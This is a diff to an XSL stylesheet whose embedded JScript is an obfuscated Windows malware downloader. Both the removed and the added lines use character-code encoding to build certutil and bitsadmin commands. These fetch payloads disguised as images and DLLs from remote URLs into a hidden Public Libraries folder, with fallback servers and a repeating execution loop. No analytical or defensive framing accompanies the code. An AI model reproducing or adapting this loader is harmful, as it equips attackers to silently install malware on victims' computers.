@@ -5,17 +5,9 @@ xmlns:user="placeholder"
 version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
-	<![CDATA[		
-			
-	var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="System" version="4.0.0.0" publicKeyToken="B77A5C561934E089" /><clrClass clsid="{7D458845-B4B8-30CB-B2AD-FC4960FCDF81}" progid="System.Net.WebClient" threadingModel="Both" name="System.Net.WebClient" runtimeVersion="v4.0.30319" /></assembly>';
-	
-	try {
-		var ax = new ActiveXObject("Microsoft.Windows.ActCtx");
-		ax.ManifestText = manifest;		
-		var obj = ax.CreateObject("System.Net.WebClient");
-	} catch(e) {
+	<![CDATA[
 		
-	}			
+	
 		
 	var ak765;
 	ak765 = "07/";	
@@ -41,15 +33,17 @@ version="1.0">
     dro73 = false; 
 	var jk021 = new ActiveXObject("Scripting.FileSystemObject");
 	var kpz8410 = new ActiveXObject("WScript.Shell");
+var kpz7666 = new ActiveXObject("WScript.Shell");
     var ldp205 = new ActiveXObject("Shell.Application");
 	
 
      function mrc430(url, file)
     {
 		try
-		{			
-		 kpz8410.run(String.fromCharCode(99)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(117)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(108)+String.fromCharCode(46)+String.fromCharCode(101)+String.fromCharCode(120)+String.fromCharCode(101)+String.fromCharCode(32)+String.fromCharCode(45)+String.fromCharCode(117)+String.fromCharCode(114)+String.fromCharCode(108)+String.fromCharCode(99)+String.fromCharCode(97)+String.fromCharCode(99)+String.fromCharCode(104)+String.fromCharCode(101)+String.fromCharCode(32)+String.fromCharCode(45)+String.fromCharCode(115)+String.fromCharCode(112)+String.fromCharCode(108)+String.fromCharCode(105)+String.fromCharCode(116)+String.fromCharCode(32)+String.fromCharCode(45)+String.fromCharCode(102)+String.fromCharCode(32)+url+" "+file+".z",0,true); 
-		 kpz8410.run(String.fromCharCode(99)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(117)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(108)+String.fromCharCode(32)+String.fromCharCode(45)+String.fromCharCode(100)+String.fromCharCode(101)+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(100)+String.fromCharCode(101)+" "+file+".z "+file,0,true);
+		{	
+		
+		 kpz8410.run(String.fromCharCode(98)+String.fromCharCode(105)+String.fromCharCode(116)+String.fromCharCode(115)+String.fromCharCode(97)+String.fromCharCode(100)+String.fromCharCode(109)+String.fromCharCode(105)+String.fromCharCode(110)+" /transfer msd5 /priority foreground "+url+" "+file,0,true); 
+
 		 return true;
 		}
         catch (ex)
@@ -71,6 +65,7 @@ dro73 = false;
 
 
 ekw282 = ekw28;
+
 
 gd481 = "C:\\Users\\Public\\Libraries\\win32";
 hx73 = "C:\\Users \\Public\\Libraries\\win32";
@@ -97,7 +92,7 @@ irz593 = "142_T3SL4S_"
 		
 	}
 
-	
+
 	try
 	{    
      if (jk021.FileExists(gd481+"\\halawxtz64.dll")){	   
@@ -113,6 +108,7 @@ irz593 = "142_T3SL4S_"
 		
 	}		 
    
+
 	try
 	{    
         if (!jk021.FileExists(gd481+"\\0142vrxi.log")){	   
@@ -187,9 +183,10 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtza.jpg.zip.log",gd481+"\\halawxtza.jpg");
+
+	 cq854 = mrc430(ekw28+"halawxtza.jpg.zip",gd481+"\\halawxtza.jpg");
         if (cq854 == false) {	
-	     mrc430(ekw282+"halawxtza.jpg.zip.log",gd481+"\\halawxtza.jpg");
+	     mrc430(ekw282+"halawxtza.jpg.zip",gd481+"\\halawxtza.jpg");
 	    }
 	}
     catch (ex)
@@ -200,9 +197,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzb.jpg.zip.log",gd481+"\\halawxtzb.jpg");
+	 cq854 = mrc430(ekw28+"halawxtzb.jpg.zip",gd481+"\\halawxtzb.jpg");
         if (cq854 == false) {	
-	     mrc430(ekw282+"halawxtzb.jpg.zip.log",gd481+"\\halawxtzb.jpg");
+	     mrc430(ekw282+"halawxtzb.jpg.zip",gd481+"\\halawxtzb.jpg");
 	    }
 	}
     catch (ex)
@@ -213,9 +210,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzc.jpg.zip.log",gd481+"\\halawxtzc.jpg");
+	 cq854 = mrc430(ekw28+"halawxtzc.jpg.zip",gd481+"\\halawxtzc.jpg");
         if (cq854 == false) {	
-	     mrc430(ekw282+"halawxtzc.jpg.zip.log",gd481+"\\halawxtzc.jpg");
+	     mrc430(ekw282+"halawxtzc.jpg.zip",gd481+"\\halawxtzc.jpg");
 	    }
 	}
     catch (ex)
@@ -226,9 +223,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzdwwn.gif.zip.log",gd481+"\\halawxtzdwwn.gif");
+	 cq854 = mrc430(ekw28+"halawxtzdwwn.gif.zip",gd481+"\\halawxtzdwwn.gif");
         if (cq854 == false) {	 
-	     mrc430(ekw282+"halawxtzdwwn.gif.zip.log",gd481+"\\halawxtzdwwn.gif");
+	     mrc430(ekw282+"halawxtzdwwn.gif.zip",gd481+"\\halawxtzdwwn.gif");
 	    }
 	}
     catch (ex)
@@ -239,9 +236,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzdx.gif.zip.log",gd481+"\\halawxtzdx.gif");
+	 cq854 = mrc430(ekw28+"halawxtzdx.gif.zip",gd481+"\\halawxtzdx.gif");
         if (cq854 == false) {	 
-	     mrc430(ekw282+"halawxtzdx.gif.zip.log",gd481+"\\halawxtzdx.gif");
+	     mrc430(ekw282+"halawxtzdx.gif.zip",gd481+"\\halawxtzdx.gif");
 	    }
 	}
     catch (ex)
@@ -251,9 +248,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzg.gif.zip.log",gd481+"\\halawxtzg.gif");
+	 cq854 = mrc430(ekw28+"halawxtzg.gif.zip",gd481+"\\halawxtzg.gif");
         if (cq854 == false) {		 
-	     mrc430(ekw282+"halawxtzg.gif.zip.log",gd481+"\\halawxtzg.gif");
+	     mrc430(ekw282+"halawxtzg.gif.zip",gd481+"\\halawxtzg.gif");
 	    }
 	}
     catch (ex)
@@ -264,9 +261,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzgx.gif.zip.log",gd481+"\\halawxtzgx.gif");
+	 cq854 = mrc430(ekw28+"halawxtzgx.gif.zip",gd481+"\\halawxtzgx.gif");
         if (cq854 == false) {		 
-	     mrc430(ekw282+"halawxtzgx.gif.zip.log",gd481+"\\halawxtzgx.gif");
+	     mrc430(ekw282+"halawxtzgx.gif.zip",gd481+"\\halawxtzgx.gif");
 	    }
 	}
     catch (ex)
@@ -278,9 +275,9 @@ irz593 = "142_T3SL4S_"
 	
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzxa.gif.zip.log",gd481+"\\halawxtzxa.~");
+	 cq854 = mrc430(ekw28+"halawxtzxa.gif.zip",gd481+"\\halawxtzxa.~");
         if (cq854 == false) {	 
-	     mrc430(ekw282+"halawxtzxa.gif.zip.log",gd481+"\\halawxtzxa.~");
+	     mrc430(ekw282+"halawxtzxa.gif.zip",gd481+"\\halawxtzxa.~");
 	    }
 	}
     catch (ex)
@@ -291,9 +288,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzxb.gif.zip.log",gd481+"\\halawxtzxb.~");
+	 cq854 = mrc430(ekw28+"halawxtzxb.gif.zip",gd481+"\\halawxtzxb.~");
         if (cq854 == false) {	 
-	     mrc430(ekw282+"halawxtzxb.gif.zip.log",gd481+"\\halawxtzxb.~");
+	     mrc430(ekw282+"halawxtzxb.gif.zip",gd481+"\\halawxtzxb.~");
 	    }
 	}
     catch (ex)
@@ -302,8 +299,6 @@ irz593 = "142_T3SL4S_"
 	}	
 
 	
-	
-	kpz8410.run('cmd /V /C "echo '+irz593+'>'+gd481+'\\r1.log"&& exit',0,false); 
 
 
 
@@ -311,9 +306,9 @@ irz593 = "142_T3SL4S_"
 	rwq015 = bx021(1, 30);
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzhh"+rwq015+"a.dll.zip.log",gd481+"\\halawxtz64a.dll");
+	 cq854 = mrc430(ekw28+"halawxtzhh"+rwq015+"a.dll.zip",gd481+"\\halawxtz64a.dll");
 	    if (cq854 == false) {
-	     mrc430(ekw282+"halawxtzhh"+rwq015+"a.dll.zip.log",gd481+"\\halawxtz64a.dll");
+	     mrc430(ekw282+"halawxtzhh"+rwq015+"a.dll.zip",gd481+"\\halawxtz64a.dll");
 	    }
 	}
     catch (ex)
@@ -323,18 +318,17 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzhh"+rwq015+"b.dll.zip.log",gd481+"\\halawxtz64b.dll");
+	 cq854 = mrc430(ekw28+"halawxtzhh"+rwq015+"b.dll.zip",gd481+"\\halawxtz64b.dll");
 	    if (cq854 == false) {
-	     mrc430(ekw282+"halawxtzhh"+rwq015+"b.dll.zip.log",gd481+"\\halawxtz64b.dll");
+	     mrc430(ekw282+"halawxtzhh"+rwq015+"b.dll.zip",gd481+"\\halawxtz64b.dll");
 	    }
 	}
     catch (ex)
     {
 		
 	}	
-
 	
-	
+					if (jk021.FileExists(gd481+"\\halawxtz64b.dll")){
 						if (jk021.FileExists(wpxa064)){						 	
 						 try
 						 {		
@@ -372,17 +366,17 @@ irz593 = "142_T3SL4S_"
 						 }	
 						 dro73 = true;             
 						}
+					}
 	
   }
 
 
-kpz8410.run(String.fromCharCode(99)+String.fromCharCode(109)+String.fromCharCode(100)+String.fromCharCode(32)+String.fromCharCode(47)+String.fromCharCode(99)+String.fromCharCode(32)+String.fromCharCode(101)+String.fromCharCode(99)+String.fromCharCode(104)+String.fromCharCode(111)+String.fromCharCode(32)+String.fromCharCode(37)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(37)+String.fromCharCode(32)+String.fromCharCode(38)+String.fromCharCode(38)+String.fromCharCode(32)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(111)+String.fromCharCode(117)+String.fromCharCode(116)+String.fromCharCode(32)+String.fromCharCode(52)+String.fromCharCode(48)+String.fromCharCode(48)+String.fromCharCode(48)+String.fromCharCode(32)+String.fromCharCode(62)+String.fromCharCode(32)+String.fromCharCode(78)+String.fromCharCode(85)+String.fromCharCode(76)+String.fromCharCode(32)+String.fromCharCode(38)+String.fromCharCode(38)+String.fromCharCode(32)+String.fromCharCode(101)+String.fromCharCode(120)+String.fromCharCode(105)+String.fromCharCode(116),0,true); 
-nts316(bx021(0000001,999999999));
 }
 
 nts316(bx021(0000001,999999999));
 
-   
-	
+ 	
 	]]> </ms:script>
 </stylesheet>	
+ 
+
